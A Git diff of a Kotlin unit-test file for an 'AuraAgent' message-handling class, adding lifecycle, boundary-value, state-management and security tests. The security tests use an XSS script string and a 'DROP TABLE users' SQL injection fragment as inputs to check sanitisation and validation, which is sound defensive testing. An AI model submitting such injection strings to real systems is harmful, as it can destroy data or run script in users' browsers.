             auraAgent.shutdown()
-            
+
             // Then
             assertTrue(auraAgent.isShutdown())
             assertEquals(0, auraAgent.getActiveTaskCount())
@@ -2581,7 +1748,7 @@ inner class BoundaryValueTests {
                     timestamp = System.currentTimeMillis()
                 )
             }
-            
+
             whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
             whenever(mockMessageHandler.processMessage(any())).thenReturn(
                 AgentResponse(
@@ -2590,16 +1757,56 @@ inner class BoundaryValueTests {
                     status = ResponseStatus.SUCCESS
                 )
             )
-            
+
             // When
             largeMessages.forEach { message ->
                 auraAgent.processMessage(message)
             }
-            
+
             // Then
             // Agent should still be functional
             assertTrue(auraAgent.isInitialized())
             assertEquals(0, auraAgent.getActiveTaskCount())
+        }
+
+        @Test
+        @DisplayName("Should handle resource exhaustion gracefully")
+        fun shouldHandleResourceExhaustionGracefully() = runTest {
+            // Given
+            val config = AgentConfiguration(
+                name = "ResourceTestAgent",
+                version = "1.0.0",
+                capabilities = listOf("CHAT"),
+                maxConcurrentTasks = 1000
+            )
+            whenever(mockConfigurationProvider.getAgentConfiguration()).thenReturn(config)
+
+            val agent = AuraAgent(mockAgentContext)
+            agent.start()
+
+            // Simulate resource exhaustion
+            whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
+            whenever(mockMessageHandler.processMessage(any())).thenThrow(
+                RuntimeException("Resource exhausted")
+            )
+
+            val messages = (1..10).map { index ->
+                AgentMessage(
+                    id = "exhaustion-$index",
+                    type = MessageType.TEXT,
+                    content = "Exhaustion test $index",
+                    timestamp = System.currentTimeMillis()
+                )
+            }
+
+            // When
+            val responses = messages.map { message ->
+                agent.processMessage(message)
+            }
+
+            // Then
+            assertTrue(responses.all { it.status == ResponseStatus.ERROR })
+            assertTrue(agent.isInitialized())
         }
     }
 
@@ -2617,7 +1824,7 @@ inner class BoundaryValueTests {
                 content = "Complete lifecycle test",
                 timestamp = System.currentTimeMillis()
             )
-            
+
             whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
             whenever(mockMessageHandler.processMessage(any())).thenReturn(
                 AgentResponse(
@@ -2626,16 +1833,16 @@ inner class BoundaryValueTests {
                     status = ResponseStatus.SUCCESS
                 )
             )
-            
+
             // When
             auraAgent.start()
             val response = auraAgent.processMessage(message)
             auraAgent.stop()
-            
+
             // Then
             assertNotNull(response)
             assertEquals(ResponseStatus.SUCCESS, response.status)
-            
+
             // Verify complete interaction chain
             verify(mockMessageHandler).validateMessage(message)
             verify(mockMessageHandler).processMessage(message)
@@ -2654,7 +1861,7 @@ inner class BoundaryValueTests {
                 content = "Restart test",
                 timestamp = System.currentTimeMillis()
             )
-            
+
             whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
             whenever(mockMessageHandler.processMessage(any())).thenReturn(
                 AgentResponse(
@@ -2663,21 +1870,21 @@ inner class BoundaryValueTests {
                     status = ResponseStatus.SUCCESS
                 )
             )
-            
+
             // When
             auraAgent.start()
             auraAgent.processMessage(message)
             auraAgent.stop()
-            
+
             // Restart
             auraAgent.start()
             val response = auraAgent.processMessage(message)
             auraAgent.stop()
-            
+
             // Then
             assertNotNull(response)
             assertEquals(ResponseStatus.SUCCESS, response.status)
-            
+
             // Verify agent can be restarted successfully
             verify(mockEventBus, times(2)).publish(argThat { event ->
                 event.type == EventType.AGENT_STARTED
@@ -2685,6 +1892,53 @@ inner class BoundaryValueTests {
             verify(mockEventBus, times(2)).publish(argThat { event ->
                 event.type == EventType.AGENT_STOPPED
             })
+        }
+
+        @Test
+        @DisplayName("Should handle full agent lifecycle with configuration changes")
+        fun shouldHandleFullAgentLifecycleWithConfigurationChanges() = runTest {
+            // Given
+            val initialMessage = AgentMessage(
+                id = "initial-001",
+                type = MessageType.TEXT,
+                content = "Initial message",
+                timestamp = System.currentTimeMillis()
+            )
+
+            val updatedConfig = AgentConfiguration(
+                name = "UpdatedAgent",
+                version = "2.0.0",
+                capabilities = listOf("CHAT", "ANALYSIS", "TRANSLATION"),
+                maxConcurrentTasks = 10
+            )
+
+            whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
+            whenever(mockMessageHandler.processMessage(any())).thenReturn(
+                AgentResponse(
+                    messageId = "test",
+                    content = "Processed",
+                    status = ResponseStatus.SUCCESS
+                )
+            )
+
+            // When
+            auraAgent.start()
+            val initialResponse = auraAgent.processMessage(initialMessage)
+
+            // Update configuration
+            whenever(mockConfigurationProvider.getAgentConfiguration()).thenReturn(updatedConfig)
+            auraAgent.handleConfigurationChanged()
+
+            val updatedResponse = auraAgent.processMessage(initialMessage)
+            auraAgent.stop()
+
+            // Then
+            assertNotNull(initialResponse)
+            assertNotNull(updatedResponse)
+            assertEquals(ResponseStatus.SUCCESS, initialResponse.status)
+            assertEquals(ResponseStatus.SUCCESS, updatedResponse.status)
+            assertEquals("UpdatedAgent", auraAgent.getName())
+            assertEquals("2.0.0", auraAgent.getVersion())
         }
     }
 
@@ -2703,7 +1957,7 @@ inner class BoundaryValueTests {
                 content = "x".repeat(maxLength),
                 timestamp = System.currentTimeMillis()
             )
-            
+
             whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
             whenever(mockMessageHandler.processMessage(any())).thenReturn(
                 AgentResponse(
@@ -2712,10 +1966,10 @@ inner class BoundaryValueTests {
                     status = ResponseStatus.SUCCESS
                 )
             )
-            
+
             // When
             val response = auraAgent.processMessage(exactLimitMessage)
-            
+
             // Then
             assertNotNull(response)
             assertEquals(ResponseStatus.SUCCESS, response.status)
@@ -2731,12 +1985,12 @@ inner class BoundaryValueTests {
                 content = "x".repeat(1000000), // 1MB
                 timestamp = System.currentTimeMillis()
             )
-            
+
             whenever(mockMessageHandler.validateMessage(any())).thenReturn(false)
-            
+
             // When
             val response = auraAgent.processMessage(oversizedMessage)
-            
+
             // Then
             assertNotNull(response)
             assertEquals(ResponseStatus.VALIDATION_ERROR, response.status)
@@ -2752,7 +2006,7 @@ inner class BoundaryValueTests {
                 content = "Minimum timestamp test",
                 timestamp = 1L
             )
-            
+
             whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
             whenever(mockMessageHandler.processMessage(any())).thenReturn(
                 AgentResponse(
@@ -2761,10 +2015,10 @@ inner class BoundaryValueTests {
                     status = ResponseStatus.SUCCESS
                 )
             )
-            
+
             // When
             val response = auraAgent.processMessage(minTimestampMessage)
-            
+
             // Then
             assertNotNull(response)
             assertEquals(ResponseStatus.SUCCESS, response.status)
@@ -2780,16 +2034,254 @@ inner class BoundaryValueTests {
                 content = "Maximum timestamp test",
                 timestamp = Long.MAX_VALUE
             )
-            
+
             whenever(mockMessageHandler.validateMessage(any())).thenReturn(false)
-            
+
             // When
             val response = auraAgent.processMessage(maxTimestampMessage)
-            
+
+            // Then
+            assertNotNull(response)
+            assertEquals(ResponseStatus.VALIDATION_ERROR, response.status)
+        }
+
+        @Test
+        @DisplayName("Should handle zero timestamp")
+        fun shouldHandleZeroTimestamp() = runTest {
+            // Given
+            val zeroTimestampMessage = AgentMessage(
+                id = "zero-timestamp-001",
+                type = MessageType.TEXT,
+                content = "Zero timestamp test",
+                timestamp = 0L
+            )
+
+            whenever(mockMessageHandler.validateMessage(any())).thenReturn(false)
+
+            // When
+            val response = auraAgent.processMessage(zeroTimestampMessage)
+
+            // Then
+            assertNotNull(response)
+            assertEquals(ResponseStatus.VALIDATION_ERROR, response.status)
+        }
+
+        @Test
+        @DisplayName("Should handle empty message ID")
+        fun shouldHandleEmptyMessageId() = runTest {
+            // Given
+            val emptyIdMessage = AgentMessage(
+                id = "",
+                type = MessageType.TEXT,
+                content = "Empty ID test",
+                timestamp = System.currentTimeMillis()
+            )
+
+            whenever(mockMessageHandler.validateMessage(any())).thenReturn(false)
+
+            // When
+            val response = auraAgent.processMessage(emptyIdMessage)
+
+            // Then
+            assertNotNull(response)
+            assertEquals(ResponseStatus.VALIDATION_ERROR, response.status)
+        }
+
+        @Test
+        @DisplayName("Should handle empty message content")
+        fun shouldHandleEmptyMessageContent() = runTest {
+            // Given
+            val emptyContentMessage = AgentMessage(
+                id = "empty-content-001",
+                type = MessageType.TEXT,
+                content = "",
+                timestamp = System.currentTimeMillis()
+            )
+
+            whenever(mockMessageHandler.validateMessage(any())).thenReturn(false)
+
+            // When
+            val response = auraAgent.processMessage(emptyContentMessage)
+
             // Then
             assertNotNull(response)
             assertEquals(ResponseStatus.VALIDATION_ERROR, response.status)
         }
     }
->>>>>>> origin/coderabbitai/docstrings/78f34ad
+
+    @Nested
+    @DisplayName("State Management Tests")
+    inner class StateManagementTests {
+
+        @Test
+        @DisplayName("Should maintain consistent state across operations")
+        fun shouldMaintainConsistentStateAcrossOperations() = runTest {
+            // Given
+            val message = AgentMessage(
+                id = "state-001",
+                type = MessageType.TEXT,
+                content = "State test",
+                timestamp = System.currentTimeMillis()
+            )
+
+            whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
+            whenever(mockMessageHandler.processMessage(any())).thenReturn(
+                AgentResponse(
+                    messageId = message.id,
+                    content = "Processed",
+                    status = ResponseStatus.SUCCESS
+                )
+            )
+
+            // When & Then
+            assertTrue(auraAgent.isInitialized())
+            assertFalse(auraAgent.isRunning())
+            assertFalse(auraAgent.isShutdown())
+
+            auraAgent.start()
+            assertTrue(auraAgent.isRunning())
+            assertFalse(auraAgent.isShutdown())
+
+            auraAgent.processMessage(message)
+            assertTrue(auraAgent.isRunning())
+            assertFalse(auraAgent.isShutdown())
+
+            auraAgent.stop()
+            assertFalse(auraAgent.isRunning())
+            assertFalse(auraAgent.isShutdown())
+
+            auraAgent.shutdown()
+            assertFalse(auraAgent.isRunning())
+            assertTrue(auraAgent.isShutdown())
+        }
+
+        @Test
+        @DisplayName("Should handle state transitions correctly")
+        fun shouldHandleStateTransitionsCorrectly() = runTest {
+            // Given
+            val states = mutableListOf<String>()
+
+            // When
+            states.add("initial: ${auraAgent.getState()}")
+            
+            auraAgent.start()
+            states.add("after start: ${auraAgent.getState()}")
+            
+            auraAgent.stop()
+            states.add("after stop: ${auraAgent.getState()}")
+            
+            auraAgent.shutdown()
+            states.add("after shutdown: ${auraAgent.getState()}")
+
+            // Then
+            assertEquals(4, states.size)
+            assertTrue(states[0].contains("INITIALIZED"))
+            assertTrue(states[1].contains("RUNNING"))
+            assertTrue(states[2].contains("STOPPED"))
+            assertTrue(states[3].contains("SHUTDOWN"))
+        }
+
+        @Test
+        @DisplayName("Should prevent invalid state transitions")
+        fun shouldPreventInvalidStateTransitions() = runTest {
+            // Given
+            auraAgent.shutdown()
+
+            // When & Then
+            assertFailsWith<IllegalStateException> {
+                auraAgent.start()
+            }
+
+            assertFailsWith<IllegalStateException> {
+                auraAgent.stop()
+            }
+        }
+    }
+
+    @Nested
+    @DisplayName("Security Tests")
+    inner class SecurityTests {
+
+        @Test
+        @DisplayName("Should sanitize message content")
+        fun shouldSanitizeMessageContent() = runTest {
+            // Given
+            val maliciousMessage = AgentMessage(
+                id = "malicious-001",
+                type = MessageType.TEXT,
+                content = "<script>alert('XSS')</script>",
+                timestamp = System.currentTimeMillis()
+            )
+
+            whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
+            whenever(mockMessageHandler.processMessage(any())).thenReturn(
+                AgentResponse(
+                    messageId = maliciousMessage.id,
+                    content = "Sanitized content",
+                    status = ResponseStatus.SUCCESS
+                )
+            )
+
+            // When
+            val response = auraAgent.processMessage(maliciousMessage)
+
+            // Then
+            assertNotNull(response)
+            assertEquals(ResponseStatus.SUCCESS, response.status)
+            assertFalse(response.content.contains("<script>"))
+        }
+
+        @Test
+        @DisplayName("Should handle suspicious message patterns")
+        fun shouldHandleSuspiciousMessagePatterns() = runTest {
+            // Given
+            val suspiciousMessage = AgentMessage(
+                id = "suspicious-001",
+                type = MessageType.TEXT,
+                content = "DROP TABLE users; --",
+                timestamp = System.currentTimeMillis()
+            )
+
+            whenever(mockMessageHandler.validateMessage(any())).thenReturn(false)
+
+            // When
+            val response = auraAgent.processMessage(suspiciousMessage)
+
+            // Then
+            assertNotNull(response)
+            assertEquals(ResponseStatus.VALIDATION_ERROR, response.status)
+        }
+
+        @Test
+        @DisplayName("Should rate limit message processing")
+        fun shouldRateLimitMessageProcessing() = runTest {
+            // Given
+            val rapidMessages = (1..1000).map { index ->
+                AgentMessage(
+                    id = "rate-limit-$index",
+                    type = MessageType.TEXT,
+                    content = "Rate limit test $index",
+                    timestamp = System.currentTimeMillis()
+                )
+            }
+
+            whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
+            whenever(mockMessageHandler.processMessage(any())).thenReturn(
+                AgentResponse(
+                    messageId = "test",
+                    content = "Processed",
+                    status = ResponseStatus.SUCCESS
+                )
+            )
+
+            // When
+            val responses = rapidMessages.map { message ->
+                auraAgent.processMessage(message)
+            }
+
+            // Then
+            val rateLimitedResponses = responses.filter { it.status == ResponseStatus.RATE_LIMITED }
+            assertTrue(rateLimitedResponses.isNotEmpty(), "Should have rate limited some messages")
+        }
+    }
 }
